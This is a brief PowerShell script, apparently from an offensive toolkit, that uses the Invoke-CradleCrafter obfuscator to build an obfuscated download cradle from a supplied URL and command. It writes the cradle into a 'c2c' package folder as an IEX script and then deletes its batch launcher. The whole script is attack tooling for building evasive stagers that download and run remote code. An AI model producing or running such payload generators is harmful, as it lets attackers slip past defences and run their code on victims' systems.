# Generate Cradle Crafted payload
$tx=$args[0]
$cd=$args[1]
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path

function runCradlecraft {
	Import-Module $ScriptDir\Build\obfuscator\Invoke-CradleCrafter.psd1
	$cradle = Invoke-CradleCrafter -Url $tx -Command $cd -Quiet
	$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path	
	set-content $ScriptDir\Package\c2c\pnt-secured-iex.ps1 -Value $cradle
}
runCradlecraft
del $ScriptDir\cradl.bat